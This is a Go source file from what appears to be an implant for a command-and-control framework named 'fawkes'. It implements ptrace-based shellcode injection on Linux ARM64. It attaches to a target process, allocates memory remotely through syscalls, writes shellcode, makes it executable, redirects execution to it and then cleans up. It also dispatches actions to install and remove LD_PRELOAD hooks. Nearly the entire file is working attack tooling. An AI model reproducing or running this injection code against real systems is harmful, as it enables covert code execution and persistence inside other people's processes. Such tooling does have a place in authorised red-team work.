//go:build linux && arm64

package commands

import (
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"

	"fawkes/pkg/structs"
)

func (c *PtraceInjectCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("parameters required. Actions: check, inject")
	}

	args, parseErr := unmarshalParams[ptraceInjectArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	action := strings.ToLower(args.Action)
	if action == "" {
		action = "inject"
	}

	switch action {
	case "check":
		return ptraceCheck()
	case "inject":
		return ptraceInjectArm64(args)
	case "ld-preload":
		return ldPreloadList()
	case "ld-install":
		ldArgs, ldParseErr := unmarshalParams[ldPreloadArgs](task)
		if ldParseErr != nil {
			return *ldParseErr
		}
		return ldPreloadInstall(ldArgs)
	case "ld-remove":
		ldArgs, ldParseErr := unmarshalParams[ldPreloadArgs](task)
		if ldParseErr != nil {
			return *ldParseErr
		}
		return ldPreloadRemove(ldArgs)
	default:
		return errorf("Unknown action: %s\nAvailable: check, inject, ld-preload, ld-install, ld-remove", args.Action)
	}
}

func ptraceInjectArm64(args ptraceInjectArgs) structs.CommandResult {
	shellcode, restore, timeout, err := ptraceValidateAndDecode(args)
	if err != nil {
		return errorf("%v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", args.PID))
	sb.WriteString(fmt.Sprintf("[*] Restore: %v\n", restore))
	sb.WriteString("[*] Architecture: ARM64\n")

	if err := ptraceCheckProcess(args.PID); err != nil {
		return errorResult(sb.String() + fmt.Sprintf("[!] %v\n", err))
	}

	scope, yamaHint := checkYamaScope()
	if scope >= 1 && os.Geteuid() != 0 {
		sb.WriteString(fmt.Sprintf("[!] %s\n", yamaHint))
	}

	ptraceSendSIGCONTIfStopped(args.PID, &sb)

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	sb.WriteString(fmt.Sprintf("[*] Attaching to PID %d...\n", args.PID))
	if err := syscall.PtraceAttach(args.PID); err != nil {
		if err == syscall.EPERM && scope >= 1 {
			return errorResult(sb.String() + fmt.Sprintf("[!] Attach failed: %v\n[!] %s\n", err, yamaHint))
		}
		return errorResult(sb.String() + fmt.Sprintf("[!] Attach failed: %v\n", err))
	}

	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(args.PID, &ws, 0, nil); err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Wait4 failed: %v\n", err))
	}
	sb.WriteString("[+] Process stopped\n")

	var origRegs syscall.PtraceRegs
	if err := syscall.PtraceGetRegs(args.PID, &origRegs); err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Register read failed: %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Saved registers (PC=0x%X, SP=0x%X)\n", origRegs.Pc, origRegs.Sp))

	svcAddr, err := findSyscallGadget(args.PID)
	if err != nil {
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Found SVC gadget at 0x%X\n", svcAddr))

	pageSize := uint64(4096)
	scSize := uint64(len(shellcode))
	if restore {
		scSize += 4 // BRK #0 is 4 bytes on ARM64
	}
	if scSize > pageSize {
		pageSize = ((scSize + 4095) / 4096) * 4096
	}

	rwAddr, err := execRemoteSyscallArm64(args.PID, &origRegs, svcAddr,
		arm64SysMmap, 0, pageSize, 3, 0x22, ^uint64(0), 0)
	if err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Memory allocation failed: %v\n", err))
	}
	if rwAddr >= 0xfffffffffffff000 {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Memory allocation returned error (0x%X)\n", rwAddr))
	}
	sb.WriteString(fmt.Sprintf("[+] Allocated writable memory at 0x%X (%d bytes)\n", rwAddr, pageSize))

	injectionCode := make([]byte, len(shellcode))
	copy(injectionCode, shellcode)
	if restore {
		// BRK #0 = 0x00, 0x00, 0x20, 0xD4 (generates SIGTRAP on ARM64)
		injectionCode = append(injectionCode, 0x00, 0x00, 0x20, 0xD4)
	}

	if _, err := syscall.PtracePokeText(args.PID, uintptr(rwAddr), injectionCode); err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Failed to write shellcode: %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes at 0x%X\n", len(injectionCode), rwAddr))

	mprotectRet, err := execRemoteSyscallArm64(args.PID, &origRegs, svcAddr,
		arm64SysMprotect, rwAddr, pageSize, 5, 0, 0, 0)
	if err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Protection change failed: %v\n", err))
	}
	ptraceMprotectCheck(mprotectRet, &sb)

	newRegs := origRegs
	newRegs.Pc = rwAddr
	if err := syscall.PtraceSetRegs(args.PID, &newRegs); err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Register write failed: %v\n", err))
	}
	sb.WriteString(fmt.Sprintf("[+] Set PC to 0x%X\n", rwAddr))

	sb.WriteString("[*] Continuing execution...\n")
	if err := syscall.PtraceCont(args.PID, 0); err != nil {
		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
		_ = syscall.PtraceDetach(args.PID)
		return errorResult(sb.String() + fmt.Sprintf("[!] Continue failed: %v\n", err))
	}

	if restore {
		stopped, ws := ptraceWaitForShellcode(args.PID, timeout, &sb)
		if !ptraceReportCompletion(stopped, ws, timeout, &sb) {
			_ = syscall.PtraceDetach(args.PID)
			return successResult(sb.String())
		}

		munmapRegs := origRegs
		munmapRegs.Pc = svcAddr
		munmapRegs.Regs[8] = arm64SysMunmap
		munmapRegs.Regs[0] = rwAddr
		munmapRegs.Regs[1] = pageSize
		if err := syscall.PtraceSetRegs(args.PID, &munmapRegs); err == nil {
			if err := syscall.PtraceSingleStep(args.PID); err == nil {
				_, _ = syscall.Wait4(args.PID, &ws, 0, nil)
				sb.WriteString("[+] Cleaned up RWX page (munmap)\n")
			}
		}

		if err := syscall.PtraceSetRegs(args.PID, &origRegs); err != nil {
			sb.WriteString(fmt.Sprintf("[!] Failed to restore registers: %v\n", err))
		} else {
			sb.WriteString("[+] Restored original registers\n")
		}
	}

	ptraceDetachAndFinalize(args.PID, &sb)
	return successResult(sb.String())
}
